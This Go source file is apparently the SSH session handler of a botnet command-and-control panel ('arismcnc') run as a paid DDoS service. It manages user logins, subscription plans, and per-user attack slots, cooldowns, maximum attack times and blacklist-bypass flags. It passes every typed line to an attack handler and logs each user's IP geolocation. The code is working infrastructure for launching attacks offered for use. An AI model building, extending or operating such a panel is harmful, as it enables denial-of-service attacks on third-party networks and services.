package handlers

import (
    "arismcnc/database"
    "arismcnc/utils"
    "arismcnc/commands/cmds"
    "arismcnc/managers"
    "encoding/json"
    "fmt"
    "io"
    "log"
    "net/http"
    "strconv"
    "strings"
    "sync"
    "text/tabwriter"
    "time"
    "regexp"

    "github.com/gliderlabs/ssh"
    "github.com/mattn/go-shellwords"
    "golang.org/x/crypto/ssh/terminal"
    "golang.org/x/term"
)

var OnlineUsers = 0

var (
    OnlineUsernames []string
    mu              sync.Mutex
)

var UserConnectionTimes = make(map[string]time.Time)
var userSpinnerIndex = make(map[string]int)
var ActiveSessions = make(map[string]ssh.Session)

func init() {
	// Exportar função para acessar sessões ativas
	cmds.GetActiveSession = func(username string) (ssh.Session, bool) {
		mu.Lock()
		defer mu.Unlock()
		session, exists := ActiveSessions[username]
		return session, exists
	}
}

func stripANSI(str string) string {
    
    ansiRegex := regexp.MustCompile(`\x1b\[[0-9;]*m`)
    str = ansiRegex.ReplaceAllString(str, "")
    
    
    gradientRegex := regexp.MustCompile(`<gradient[^>]*>|</gradient>`)
    str = gradientRegex.ReplaceAllString(str, "")
    
    
    htmlRegex := regexp.MustCompile(`<[^>]+>`)
    str = htmlRegex.ReplaceAllString(str, "")
    
    return str
}


func getNextSpinnerFrame(username string) string {
    cfg := utils.GetConfig()
    frames := cfg.Misc.Spinner.Frames

    if len(frames) == 0 {
        return ""
    }

    i := userSpinnerIndex[username]
    frame := frames[i]
    userSpinnerIndex[username] = (i + 1) % len(frames)
    return frame
}


func sendMessageToSession(session ssh.Session, message string) {
    if session != nil {
        
        if !strings.HasSuffix(message, "\n") {
            message += "\n"
        }
        session.Write([]byte(message))
    }
}


func broadcastMessage(message string, isChatMessage bool) {
    mu.Lock()
    defer mu.Unlock()

    chatManager := cmds.GetChatManager()

    for username, session := range ActiveSessions {
        if isChatMessage {
            
            if chatManager.IsUserInChat(username) {
                sendMessageToSession(session, message)
            }
        } else {
            
            sendMessageToSession(session, message)
        }
    }
}

func AddUser(username string) {
    mu.Lock()
    defer mu.Unlock()
    for _, user := range OnlineUsernames {
        if user == username {
            return
        }
    }
    OnlineUsernames = append(OnlineUsernames, username)
    OnlineUsers++
    UserConnectionTimes[username] = time.Now()
}

func RemoveUser(username string) {
    mu.Lock()
    defer mu.Unlock()

    for i, user := range OnlineUsernames {
        if user == username {
            OnlineUsernames = append(OnlineUsernames[:i], OnlineUsernames[i+1:]...)
            OnlineUsers--
            delete(UserConnectionTimes, username)
            break
        }
    }

    if session, ok := ActiveSessions[username]; ok {
        session.Close()
        delete(ActiveSessions, username)
    }
}

func IsUserOnline(username string) bool {
    mu.Lock()
    defer mu.Unlock()
    for _, user := range OnlineUsernames {
        if user == username {
            return true
        }
    }
    return false
}

func replacePlaceholders(template string, data map[string]string) string {
    result := template
    for key, value := range data {
        placeholder := "<<$" + key + ">>"
        result = strings.ReplaceAll(result, placeholder, value)
    }
    return result
}

func getIPGeolocation(ip string) map[string]string {
    // Remove a porta do IP se existir
    if strings.Contains(ip, ":") {
        ip = strings.Split(ip, ":")[0]
    }
    
    url := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,regionName,city,isp,as", ip)
    
    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Get(url)
    if err != nil {
        return map[string]string{
            "country": "Unknown",
            "region":  "Unknown",
            "city":    "Unknown",
            "isp":     "Unknown",
            "asn":     "Unknown",
        }
    }
    defer resp.Body.Close()

    var result struct {
        Status string `json:"status"`
        Country string `json:"country"`
        RegionName string `json:"regionName"`
        City string `json:"city"`
        ISP string `json:"isp"`
        AS string `json:"as"`
    }

    if err := json.NewDecoder(resp.Body).Decode(&result); err != nil || result.Status != "success" {
        return map[string]string{
            "country": "Unknown",
            "region":  "Unknown",
            "city":    "Unknown",
            "isp":     "Unknown",
            "asn":     "Unknown",
        }
    }

    return map[string]string{
        "country": result.Country,
        "region":  result.RegionName,
        "city":    result.City,
        "isp":     result.ISP,
        "asn":     result.AS,
    }
}

func SessionHandler(db *database.Database, session ssh.Session) {
    username := session.User()

    err := utils.InitConfig("assets/config.json")
    if err != nil {
        session.Write([]byte("System configuration error\n"))
        session.Close()
        return
    }

    securityConfig := utils.GetSecurityConfig()
    clientIP := session.RemoteAddr().String()
    clientVersion := session.Context().ClientVersion()

    
    if !utils.CheckIPRateLimit(clientIP) {
        remaining := utils.GetIPRateLimiter().GetRemainingCooldown(clientIP)
        session.Write([]byte(fmt.Sprintf("\033[91mToo many connection attempts. Try again in %v\033[0m\n", remaining)))
        session.Close()
        return
    }

    if valid, reason := securityConfig.ValidateCNCAccess(clientIP, clientVersion); !valid {
        session.Write([]byte("Access denied: " + reason + "\n"))
        session.Close()
        return
    }

    
    if db.IsUserBanned(username) {
        session.Write([]byte("Your has been banned! Please contact our support if you have any question.\n"))
        
        
        for {
            time.Sleep(1 * time.Second)
        }
    }

    if existingSession, ok := ActiveSessions[username]; ok {
        term := terminal.NewTerminal(session, "")
        term.Write([]byte("You have an active session already. Disconnect the other session? [y/n]: "))
        response, _ := term.ReadLine()

        if strings.ToLower(response) == "y" {
            existingSession.Close()
            RemoveUser(username)

            ActiveSessions[username] = session
            AddUser(username)
            UserConnectionTimes[username] = time.Now()

            term.Write([]byte("Previous session disconnected. Welcome to your new session.\n"))
        } else {
            term.Write([]byte("Session login canceled.\n"))
            return
        }
    } else {
        AddUser(username)
        ActiveSessions[username] = session
        UserConnectionTimes[username] = time.Now()
    }

    ActiveSessions[username] = session
    AddUser(username)

    
    chatManager := cmds.GetChatManager()
    chatManager.SetBroadcastFunc(func(message string, isChatMessage bool) {
        broadcastMessage(message, isChatMessage)
    })

    cmds.GetOnlineUsersCount = func() int {
        return OnlineUsers
    }
    

    config, err := utils.LoadConfig("assets/config.json")
    if err != nil {
        return
    }
    userInfo := db.GetAccountInfo(username)
    userIp := session.RemoteAddr().String()

    go func() {
        log.Printf("[LOGIN LOG] Starting login log for user: %s from IP: %s", username, userIp)
        
        geoInfo := getIPGeolocation(userIp)
        log.Printf("[LOGIN LOG] Geolocation data: Country=%s, City=%s, ISP=%s", 
            geoInfo["country"], geoInfo["city"], geoInfo["isp"])
        
        lm, err := managers.NewLogManager("./assets/logs/logs.json")
        if err != nil {
            log.Printf("[LOGIN LOG] Error creating LogManager: %v", err)
            return
        }
        defer lm.Close()
        
        log.Printf("[LOGIN LOG] Calling LogUserLogin...")
        lm.LogUserLogin(
            username,
            userIp,
            clientVersion,
            geoInfo["country"],
            geoInfo["region"],
            geoInfo["city"],
            geoInfo["isp"],
            geoInfo["asn"],
            userInfo.Admin,
            userInfo.Vip,
            userInfo.Private,
        )
        log.Printf("[LOGIN LOG] Login log completed successfully")
    }()

    if !db.CheckIfIpExists(userInfo.Username) {
        term := terminal.NewTerminal(session, "")
        term.Write([]byte("Please type a new password: "))
        password, _ := term.ReadPassword("")
        term.Write([]byte("Please retype the password: "))
        password2, _ := term.ReadPassword("")

        if password != password2 {
            term.Write([]byte("Passwords do not match\n"))
            RemoveUser(username)
            return
        }
        db.ChangePassword(userInfo.Username, password)
    }

    db.UpdateIp(userInfo.Username, userIp)

    expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
    if err != nil {
        expiryTime = time.Now().AddDate(1, 0, 0)
    }

    creationTime, err := time.Parse("2006-01-02 15:04:05", userInfo.CreatedAt)
    if err != nil {
        creationTime = time.Now()
    }

    initialUptime := time.Since(UserConnectionTimes[username])

    daysTillExpiry := calculateDaysTillExpiry(expiryTime)
    creationDate := formatDate(creationTime)
    daysSinceCreation := calculateDaysSinceCreation(creationTime)

    brandingDataPrompt := map[string]interface{}{
        "user.Username":            session.User(),
        "user.Expiry":              utils.CalculateExpiryString(expiryTime),
        "user.Admin":               utils.CalculateInt(userInfo.Admin),
        "user.Vip":                 utils.CalculateInt(userInfo.Vip),
        "user.Private":             utils.CalculateInt(userInfo.Private),
        "user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
        "user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
        "user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
        "cnc.Uptime":               formatDuration(initialUptime),
        "cnc.UptimeMin":            formatDurationMin(initialUptime),
        "cnc.UptimeHours":          formatDurationHours(initialUptime),
        "user.TotalAttackCount":    strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
        "user.OngoingAttackCount":  strconv.Itoa(db.GetUserOngoingAttacks(userInfo.Username)),
        "AccountCreationDate":      creationDate,
        "DaysTillPlanExpiry":       daysTillExpiry,
        "DaysSincePlanCreation":    daysSinceCreation,
        "user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
        "user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
        "user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
        "user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
        "user.SSH_Client":          session.Context().ClientVersion(),
        "user.Created_by":          userInfo.CreatedBy,
        "user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
    }

    customPrompt := utils.Branding(session, "prompt", brandingDataPrompt)

    placeholderData := map[string]string{
        "AccountCreationDate":   creationDate,
        "DaysTillPlanExpiry":    daysTillExpiry,
        "DaysSincePlanCreation": daysSinceCreation,
    }

    customPrompt = replacePlaceholders(customPrompt, placeholderData)

    brandingDataMessages := map[string]interface{}{
        "user.Username":            session.User(),
        "user.Expiry":              utils.CalculateExpiryString(expiryTime),
        "user.Admin":               utils.CalculateInt(userInfo.Admin),
        "user.Vip":                 utils.CalculateInt(userInfo.Vip),
        "user.Private":             utils.CalculateInt(userInfo.Private),
        "user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
        "user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
        "user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
        "AccountCreationDate":      creationDate,
        "DaysTillPlanExpiry":       daysTillExpiry,
        "DaysSincePlanCreation":    daysSinceCreation,
        "user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
        "user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
        "user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
        "user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
        "user.SSH_Client":          session.Context().ClientVersion(),
        "user.Created_by":          userInfo.CreatedBy,
        "user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
        "clear":                    "\x1b[2J \x1b[H",
    }

    welcomeMessage := utils.Branding(session, "home-splash", brandingDataMessages)
    welcomeMessage = replacePlaceholders(welcomeMessage, placeholderData)
    utils.SendMessage(session, welcomeMessage, true)

    
    term := term.NewTerminal(session, "")

    go func() {
        cfg := utils.GetConfig()
        spinnerSpeed := time.Duration(cfg.Misc.Spinner.SpeedMs) * time.Millisecond
        
        ticker := time.NewTicker(spinnerSpeed)
        defer ticker.Stop()
        
        for range ticker.C {
            slotsInUse := db.GetCurrentAttacksLength()
            slots := config.Global_slots
            currentUptime := time.Since(UserConnectionTimes[username])
            
            spinnerFrame := getNextSpinnerFrame(username)
            
            brandingDataTitle := map[string]interface{}{
                "user.Username":                session.User(),
                "user.Expiry":                  utils.CalculateExpiryString(expiryTime),
                "user.Admin":                   utils.CalculateInt(userInfo.Admin),
                "user.Vip":                     utils.CalculateInt(userInfo.Vip),
                "user.Private":                 utils.CalculateInt(userInfo.Private),
                "cnc.Uptime":                   formatDuration(currentUptime),
                "cnc.UptimeMin":                formatDurationMin(currentUptime),
                "cnc.UptimeHours":              formatDurationHours(currentUptime),
                "user.AccountCreationDate":     creationDate,
                "user.DaysTillPlanExpiry":      daysTillExpiry,
                "user.DaysSincePlanCreation":   daysSinceCreation,
                "user.Concurrents":             strconv.Itoa(userInfo.Concurrents),
                "user.Cooldown":                strconv.Itoa(userInfo.Cooldown),
                "user.Maxtime":                 strconv.Itoa(userInfo.Maxtime),
                "user.Api_access":              utils.CalculateInt(userInfo.ApiAccess),
                "user.Power_saving_bypass":     utils.CalculateInt(userInfo.PowerSaving),
                "user.Spam_bypass":             utils.CalculateInt(userInfo.BypassSpam),
                "user.Blacklist_bypass":        utils.CalculateInt(userInfo.BypassBlacklist),
                "user.SSH_Client":              session.Context().ClientVersion(),
                "user.Created_by":              userInfo.CreatedBy,
                "cnc.Totalslots":               strconv.Itoa(slots),
                "cnc.Online":                   strconv.Itoa(OnlineUsers),
                "cnc.Usedslots":                strconv.Itoa(slotsInUse),
                "user.Total_attacks":           strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
                "cnc.Spinner":                  spinnerFrame,
            }
            
            
            title := utils.Branding(session, "title", brandingDataTitle)
            title = replacePlaceholders(title, placeholderData)
            utils.SetTitle(session, title)
        }
    }()

    commandHandler := NewCommandHandler(db, session)

    
    session.Write([]byte(customPrompt))

    for {
        line, err := term.ReadLine()
        if err != nil {
            if err == io.EOF {
                break
            }
            break
        }

        line = strings.ToLower(line)
        args, _ := shellwords.Parse(line)

        if line == "" || len(args) == 0 {
            
            session.Write([]byte(customPrompt))
            continue
        }

        AttackHandler(db, session, args)

        if line == "exit" {
            term.Write([]byte("Goodbye!\n"))
            break
        }

        if line == "online" {
            var output strings.Builder
            DisplayOnlineUsers(db, session, &output)
            term.Write([]byte(output.String()))
            
            session.Write([]byte(customPrompt))
            continue
        }

        commandHandler.ExecuteCommand(line, term)
        
        
        session.Write([]byte(customPrompt))
    }

    
    chatManager.RemoveUserFromChat(username)
    RemoveUser(username)
    delete(ActiveSessions, username)
}

func DisplayOnlineUsers(db *database.Database, session ssh.Session, output io.Writer) {
    w := tabwriter.NewWriter(output, 0, 0, 2, ' ', 0)

    fmt.Fprintln(w, "\033[37;1m#\tUsername        \tConnected   \tRoles\033[0m")
    fmt.Fprintln(w, "\033[37;1m--\t-------------- \t------------ \t--------------\033[0m")

    for index, user := range OnlineUsernames {
        userInfo := db.GetAccountInfo(user)
        roleLabels := utils.GenerateRoleLabels(userInfo.Admin, userInfo.Vip, userInfo.Private)

        connectionTime, exists := UserConnectionTimes[user]
        if !exists {
            connectionTime = time.Now()
        }
        activityDuration := time.Since(connectionTime)
        activityTimeStr := formatDuration(activityDuration)

        fmt.Fprintf(w, "\033[37;1m%d\t %s\t %s\t %s\t\033[0m\n",
            index+1, userInfo.Username, activityTimeStr, roleLabels)
    }

    w.Flush()
}

func formatUsername(username string) string {
    return fmt.Sprintf("%-14s", username)
}

func formatDuration(d time.Duration) string {
    h := d / time.Hour
    d -= h * time.Hour
    m := d / time.Minute
    d -= m * time.Minute
    s := d / time.Second
    return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
}

func formatDurationMin(d time.Duration) string {
    h := d / time.Hour
    m := (d % time.Hour) / time.Minute
    return fmt.Sprintf("%02d:%02d", h, m)
}

func formatDurationHours(d time.Duration) string {
    h := d / time.Hour
    return fmt.Sprintf("%02d", h)
}

func formatDate(t time.Time) string {
    return t.Format("2006-01-02")
}

func calculateDaysTillExpiry(expiryTime time.Time) string {
    now := time.Now()
    if expiryTime.Before(now) {
        return "0"
    }
    days := int(expiryTime.Sub(now).Hours() / 24)
    if days < 0 {
        days = 0
    }
    return strconv.Itoa(days)
}

func calculateDaysSinceCreation(creationTime time.Time) string {
    now := time.Now()
    days := int(now.Sub(creationTime).Hours() / 24)
    if days < 0 {
        days = 0
    }
    return strconv.Itoa(days)
}